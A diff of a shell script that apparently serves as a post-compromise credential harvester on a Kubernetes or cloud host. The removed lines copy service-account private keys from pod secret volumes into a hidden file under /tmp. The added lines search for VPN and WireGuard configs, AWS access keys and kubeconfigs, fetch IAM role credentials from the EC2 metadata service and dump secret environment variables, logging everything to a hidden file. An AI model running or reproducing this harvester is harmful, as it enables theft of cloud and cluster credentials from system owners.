@@ -1,16 +1,25 @@
-exec > /tmp/.sa-hunt 2>&1
-find /var/lib/kubelet/pods -path "*/volumes/kubernetes.io~secret/*" -name "*.json" -maxdepth 10 2>/dev/null | while read f; do
-  SIZE=$(wc -c < "$f" 2>/dev/null)
-  if [ "$SIZE" -gt 100 ] 2>/dev/null; then
-    HASKEY=$(grep -l "private_key" "$f" 2>/dev/null)
-    if [ -n "$HASKEY" ]; then
-      echo "SA_KEY_FOUND:$f"
-      # Extract project_id dan client_email
-      python3 -c "import json;d=json.load(open('$f'));print(f'  project={d.get(\"project_id\",\"?\")}, email={d.get(\"client_email\",\"?\")}')" 2>/dev/null
-      # Copy content
-      cat "$f" >> /tmp/.sa-keys-all 2>/dev/null
-      echo "---SEPARATOR---" >> /tmp/.sa-keys-all
-    fi
-  fi
-done
+exec > /tmp/.deep-scan 2>&1
+
+echo "=== VPN SEARCH ==="
+find / -maxdepth 6 -name "*.ovpn" -o -name "*.wg*" -o -name "wireguard*" -o -name "pritunl*" -o -name "vpn*" -o -name "*.conf" -path "*vpn*" -o -name "*.conf" -path "*wireguard*" 2>/dev/null | grep -v proc | grep -v sys | head -20
+
+echo "=== AWS CREDENTIALS SEARCH ==="
+grep -rl "AKIA" /etc /opt /var/lib/kubelet/pods 2>/dev/null | head -10
+grep -rh "AKIA" /etc /opt 2>/dev/null | head -5
+
+echo "=== KUBECONFIG SEARCH ==="  
+find / -maxdepth 5 -name "kubeconfig" -o -name ".kube" 2>/dev/null | grep -v proc | grep -v sys | head -10
+
+echo "=== IAM CREDENTIALS ==="
+# Try to get IAM from IMDS v2
+IMDS_TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)
+if [ -n "$IMDS_TOKEN" ]; then
+  ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null)
+  echo "IAM_ROLE: $ROLE"
+  curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null
+fi
+
+echo "=== ADMIN KEYS IN ENV ==="
+env | grep -i "AWS\|ADMIN\|KEY\|SECRET\|TOKEN\|VPN\|WIREGUARD" 2>/dev/null
+
 echo "DONE_$(hostname)"
